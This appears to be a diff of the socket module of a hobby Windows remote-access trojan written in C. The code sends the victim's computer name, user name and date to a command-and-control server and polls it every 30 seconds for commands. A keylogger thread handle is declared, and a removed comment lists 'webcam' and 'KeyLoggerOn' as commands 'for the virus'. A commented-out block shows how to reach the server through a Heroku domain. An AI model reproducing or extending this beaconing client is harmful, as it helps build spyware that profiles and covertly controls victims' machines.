@@ -1,5 +1,13 @@
 #include "Socket.h"
 
+
+// extern variables: -> needed if running with server in herkou
+//char SOCKET_IP[16] = { 0 };
+//int SOCKET_PORT = 0;
+char pc_name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 }; // global variable of the pc-name -> used in many functions.
+HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.
+
+
 // main socket function conversation.
 int start_socket()
 {
@@ -13,7 +21,7 @@ int start_socket()
     // start the socket connection
     if (connect_socket(wsaData, clientService, &ConnectSocket) != 0)
     {
-        printf("Problem starting the connection with the socket");
+        printf("Problem starting the connection with the socket \n");
         return -1;
     }
 
@@ -40,8 +48,7 @@ int start_socket()
     printf("\n---------------------------------\n");
     
 
-    // temp strcpy!!!!!
-    //strcpy(pc_name, "DESKTOP-TOSGN1S");
+    
     
     while (1)
     {
@@ -74,8 +81,8 @@ int start_socket()
 
         printf("socket closed correctly! \n");
 
-        printf("data in main func = %s \n", data);
 
+        
         //if there are commands to do
         if (data != NULL)
         {
@@ -92,23 +99,16 @@ int start_socket()
         }
         else
         {
-            printf("No commands to do.");
+            printf("No commands to do. \n");
         }
         free(data); // free the memory given
         data = NULL;
 
-
-
-        
-        /*
-        if (/*some condition)
-        {
-            /* break outside the while loop 
-        }
-        */
+        printf("Slepping ZZZZZ \n");
 
         //Sleep(ONE_MIN_IN_MILISEC); // sleep for 1 minute
-        Sleep(ONE_MIN_IN_MILISEC / 2); // temp Sleep.
+        Sleep(ONE_MIN_IN_MILISEC / 2); // temp Sleep. -> 30 seconds
+
     }
 
 
@@ -125,6 +125,23 @@ int start_socket()
 int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* ConnectSocket)
 {
     int iResult = 0;
+    /* Varibles for the getaddrinfo function */
+    struct addrinfo* result = NULL;
+    struct addrinfo* ptr = NULL;
+    struct addrinfo hints;
+
+    struct sockaddr_in* sockaddr_ipv4;
+    LPSOCKADDR sockaddr_ip;
+
+    char ipstringbuffer[46];
+    DWORD ipbufferlength = 46;
+
+
+    /*
+        
+        To connect locally
+
+    */
 
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != NO_ERROR) {
@@ -141,11 +158,11 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
     }
 
 
+
+
     clientService.sin_family = AF_INET;
     clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
     clientService.sin_port = htons(SOCKET_PORT);
-
-
 
     iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
     if (iResult == SOCKET_ERROR) {
@@ -156,6 +173,107 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
         WSACleanup();
         return -1;
     }
+
+
+    /*
+
+        To connect to some heroku server
+
+    */
+
+
+    ////////////////////////
+    
+    //--------------------------------
+    // Setup the hints address info structure
+    // which is passed to the getaddrinfo() function
+    /*ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+
+    //--------------------------------
+    // Call getaddrinfo(). If the call succeeds,
+    // the result variable will hold a linked list
+    // of addrinfo structures containing response
+    // information
+    iResult = getaddrinfo(DOMAIN_NAME, HTTP_PORT, &hints, &result);
+    if (iResult != 0) {
+        printf("getaddrinfo failed with error: %d\n", iResult);
+        WSACleanup();
+        return 1;
+    }
+
+    printf("getaddrinfo returned success\n");*/
+
+    // Retrieve each address and print out the hex bytes
+    /*for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
+    {
+        switch (ptr->ai_family)
+        {
+            case AF_INET:
+                printf("AF_INET (IPv4)\n");
+                sockaddr_ipv4 = (struct sockaddr_in*) ptr->ai_addr;
+                printf("\tIPv4 address %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));
+
+                strncpy(ipstringbuffer, inet_ntoa(sockaddr_ipv4->sin_addr), strlen(inet_ntoa(sockaddr_ipv4->sin_addr)));
+
+                // adding null byte in the end.
+                ipstringbuffer[strlen(inet_ntoa(sockaddr_ipv4->sin_addr))] = '\0';
+
+                printf("%s:%d \n", ipstringbuffer, sockaddr_ipv4->sin_port);
+                // if founded a good ip - try to connect.
+                clientService.sin_family = AF_INET;
+                clientService.sin_addr.s_addr = inet_addr(ipstringbuffer); // the ip
+                clientService.sin_port = (sockaddr_ipv4->sin_port); // the port
+
+                // initializing the global variables for the ip and port connection to send and recv the masseges.
+                strncpy(SOCKET_IP, ipstringbuffer, sizeof(SOCKET_IP));
+                SOCKET_PORT = sockaddr_ipv4->sin_port;
+
+                printf("%s:%d \n", (ipstringbuffer), (sockaddr_ipv4->sin_port));
+
+                iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
+                if (iResult == SOCKET_ERROR) {
+                    /*printf("connect function failed with error: %ld\n", WSAGetLastError());
+                    iResult = closesocket(*ConnectSocket);
+                    if (iResult == SOCKET_ERROR)
+                        printf("closesocket function failed with error: %ld\n", WSAGetLastError());
+                    WSACleanup();
+                    return -1;
+                    printf("Current ip and port are invalid! \n");
+                }
+                else
+                {
+                    // if founded good ip and port, and connected successfully - finish the loop.
+                    printf("Founded ip and port to connect! \n");
+                    ptr = NULL;
+                }
+
+                break;
+
+            default:
+                break;
+        }
+
+        // if connection has made - stop looking for other connections.
+        if (ptr == NULL)
+            break;
+
+    }
+
+    freeaddrinfo(result);
+    if (iResult == SOCKET_ERROR) {
+        printf("connect function failed with error: %ld\n", WSAGetLastError());
+        iResult = closesocket(*ConnectSocket);
+        if (iResult == SOCKET_ERROR)
+            printf("closesocket function failed with error: %ld\n", WSAGetLastError());
+        WSACleanup();
+        return -1;
+    }*/
+    
+    ///////////////////
 
     return 0;
 }
@@ -179,17 +297,6 @@ int close_socket(SOCKET* ConnectSocket)
 }
 
 
-
-// delete at the finish project
-// Example message for the first connection / commit function
-/*
-POST /first_connection HTTP/1.1\r\n
-Connection: keep-alive\r\n
-Accept: application/json\r\n\r\n
-
-{{"pc_name": "{pc_name}","user_name": "{user_name}","day_of_month": "{day_of_month}"}}
-*/
-
 int send_first_commit_packet(SOCKET* s)
 {
     int iResult = 0, buffer_size = MAX_COMPUTERNAME_LENGTH + 1, content_added_size = 0, temp_buffer_size = 0, msg_size = 0;
@@ -203,23 +310,11 @@ int send_first_commit_packet(SOCKET* s)
     //char* data = (char*) malloc(SIZE_OF_DATA);
     char* data = NULL;
     int msg_response_len = 0;
-    HANDLE pc_file_handle = NULL;
+
 
     // getting the pc name -> global variable of the pc-name
     iResult = GetComputerNameA(pc_name, &buffer_size);
     
-    // making a file named 'pc_name' that includes the pc name for the client uses.
-    pc_file_handle = CreateFileA("pc_name.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    iResult = WriteFile(pc_file_handle, pc_name, strlen(pc_name), NULL, NULL);
-    if (iResult == 0)
-    {
-        printf("Problem writing the pc_name file! \n");
-        return -1;
-    }
-
-    // closing the handle to the 'pc_name' file.
-    CloseHandle(pc_file_handle);
 
     // getting the user name
     iResult = GetUserName(user_name, &buffer_size);
@@ -232,7 +327,7 @@ int send_first_commit_packet(SOCKET* s)
     temp_buffer = (char*) malloc(temp_buffer_size);
 
     // content added
-    snprintf(temp_buffer, temp_buffer_size, "{%cpc_name%c: %c%s%c,%cuser_name%c: %c%s%c,%cday_of_month%c: %c%d%c}", APOSTROPHES, APOSTROPHES, APOSTROPHES, pc_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, user_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, st.wDay,APOSTROPHES);
+    content_added_size = snprintf(temp_buffer, temp_buffer_size, "{%cpc_name%c:%c%s%c,%cuser_name%c:%c%s%c,%cday_of_month%c:%c%d%c}", APOSTROPHES, APOSTROPHES, APOSTROPHES, pc_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, user_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, st.wDay, APOSTROPHES);
 
     // the real size of the content added
     content_added_size = strlen(temp_buffer);
@@ -241,7 +336,7 @@ int send_first_commit_packet(SOCKET* s)
     
     snprintf(content_added, content_added_size + 1, temp_buffer); // '+ 1' to include the last letter -> need one more space for the null byte '\0'
 
-    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s") + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + strlen(FIRST_CONNECTION_MSG) + strlen(content_added) + 20;
+    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s") + strlen(FIRST_CONNECTION_MSG) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + strlen(content_added) + 20;
 
     // making the full http packet to send to the server
     msg = (char*)malloc(msg_size);
@@ -250,7 +345,6 @@ int send_first_commit_packet(SOCKET* s)
     // making the full POST message
     snprintf(msg , msg_size, "%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, SOCKET_IP, SOCKET_PORT, content_added);
     
-    printf("\nmsg:\n'%s'\n", msg);
 
 
     // sending the first connection message
@@ -267,14 +361,13 @@ int send_first_commit_packet(SOCKET* s)
         return -1;
     }
     
-
+    printf("Sent first connection http packet! \n");
 
     // receiving the full message from the server
     iResult = recv(*s, server_response, SIZE_OF_HTTP_MSG, MSG_WAITALL);
     if (iResult > 0)
     {
         server_response[iResult] = '\0'; // adding the null byte
-        printf("\nserver_response = %s\n", server_response);
         msg_response_len = iResult;
     }
     else if (iResult == SOCKET_ERROR || iResult == 0) // if error occurred
@@ -283,12 +376,12 @@ int send_first_commit_packet(SOCKET* s)
         return -1;
     }
 
+    printf("Received the server's response! \n");
 
     // parsing the http message to get the data given from the server
     data = get_data_from_http_msg(server_response, iResult);
 
 
-    printf("\ntotal bytes received = %d \n", msg_response_len);
 
     // checking everything is ok -> the server got the first connection message / packet.
     if (strncmp(data, "true", sizeof("true")) != 0)
@@ -309,20 +402,13 @@ int send_first_commit_packet(SOCKET* s)
 }
 
 
-// delete at the finish project
-// Example message for the getting command message every 5 minutes
-/*
-GET /command/{pc_name} HTTP/1.1
-Connection: keep-alive
-Accept: application/json
-*/
-
 
 int get_command(SOCKET* s, char** return_data)
 {
     int iResult = 0, msg_len = 0;
     char* msg = NULL;
     char* data = NULL;
+    char buf[SIZE_OF_HTTP_MSG];
 
 
     msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT);
@@ -330,9 +416,6 @@ int get_command(SOCKET* s, char** return_data)
     msg = (char*) malloc(msg_len);
 
     msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, SOCKET_IP, SOCKET_PORT); // fixed / real len of the full message
-
-
-    printf("msg = '%s' \n", msg);
 
 
     // sending the get command message
@@ -350,17 +433,14 @@ int get_command(SOCKET* s, char** return_data)
         return -1;
     }
 
-    printf("%d bytes sent! \n", iResult);
+    printf("Sent the Get Command http packet! \n");
 
 
-
-    char buf[SIZE_OF_HTTP_MSG];
     // receiving the headers from the server
     iResult = recv(*s, buf, SIZE_OF_HTTP_MSG, MSG_WAITALL);
     if (iResult > 0)
     {
         buf[iResult] = '\0'; // adding the null byte
-        printf("buf = %s\n", buf);
     }
     else
     {
@@ -368,6 +448,7 @@ int get_command(SOCKET* s, char** return_data)
         return -1;
     }
 
+    printf("Received the server's response! \n");
 
     // parsing the http message to get the data given from the server
     data = get_data_from_http_msg(buf, iResult);
@@ -384,152 +465,3 @@ int get_command(SOCKET* s, char** return_data)
 
     return 0;
 }
-
-
-
-
-
-
-/*HTTP / 1.0 200 OK
-Content - Type: text / html; charset = utf - 8
-Content - Length: 18
-Server : Werkzeug / 1.0.1 Python / 3.8.1
-Date : Thu, 30 Jul 2020 20 : 47 : 37 GMT
-
-webcam\nKeyLoggerOn     // the data -> command for the virus //
-*/
-
-
-// NOT IN USE!!!!!!!
-
-/*
-struct MISSIONS* parse_http_packet(char* msg)
-{
-    int i = 0, j = 0, data_len = 0, missions_amount = 0, command_size = 0;
-    char start_of_data[5] = { 0 };
-    char* msg_ptr = msg; // another pointer to the message
-    char* data = NULL;
-    struct MISSIONS* missions = NULL;
-
-    while (1) // getting the index of the start of the data in the message
-    {
-        strncpy(start_of_data, msg_ptr, sizeof(start_of_data));
-
-        start_of_data[sizeof(start_of_data) - 1] = '\0'; // adding the null byte
-
-        printf("startofdata = %s \n", start_of_data);
-
-        if (strcmp(start_of_data, "\r\n\r\n") == 0) // end of headers -> start of data
-        {
-            i += 4; // to go to the start of the data
-            break;
-        }
-
-        i++;
-        msg_ptr++;
-    }
-
-    printf("i = %d \n", i);
-
-
-    data_len = strlen(msg) - i;
-
-    printf("data len = %d \n", data_len);
-
-    data = (char*)malloc(data_len + 1);
-
-    strncpy(data, (msg + i), data_len);
-
-    data[data_len] = '\0'; // adding the null byte -> if i would have made the strncpy with the size of (data_len + 1) it would add automatically the '\0', it's more readable like this
-
-    printf("data = %s \n", data);
-
-
-    missions_amount = amount_of_missions(data);
-
-    printf("amount_of_missions(data) = %d \n", missions_amount);
-
-
-    missions = (struct MISSIONS*) malloc(missions_amount); // pointer to struct of arrays
-
-
-    command_size = 0;
-    i = 0;
-    for (j = 0; j < data_len; j++)
-    {
-        command_size++;
-
-        if (data[j] == '\n' || j == data_len - 1)
-        {
-            if (data[j] == '\n')
-                strncpy(&(missions[i].command), data, command_size - 1); // to not include the '\n' char in the command
-            else
-                strncpy(&(missions[i].command), data, command_size); // if it's the last command, there is no '\n' char to miss
-
-            missions[i].command[command_size] = '\0'; // adding the null byte
-
-
-            data += command_size;
-            i++;
-            command_size = 0;
-        }
-    }
-
-    for (i = 0; i < missions_amount; i++)
-    {
-        printf("Command = %s \n", missions[i].command);
-    }
-
-
-    free(data);
-
-
-    return missions;
-}
-*/
-
-
-
-
-
-
-
-// NOT IN USE!!!!!
-
-
-// typical GET message for "/king"
-/*
-
-GET /king HTTP/1.1
-Host: 127.0.0.1:5000
-Connection: keep-alive
-Accept: text/html
-
-*/
-
-/*char* parse_http_packet(char* msg)
-{
-    int i = 4, command_len = 0; // after 'GET ' there is the start of the path asked
-
-    while (1)
-    {
-        if (msg[i] == 'H' && msg[i + 1] == 'T' && msg[i + 2] == 'T' && msg[i + 3] == 'P') // if we got to "HTTP" - we nee to stop searching 
-            break;
-        
-        i++;
-
-        command_len++;
-    }
-
-    char* command = (char*) malloc(command_len);
-
-    msg += i - command_len; // making the msg ptr to point to the command
-
-    strncpy(command, msg, command_len); // getting the command
-
-    command[command_len - 1] = '\0'; // adding the null byte
-
-    printf("command = %s ", command);
-
-    return command;
-}*/
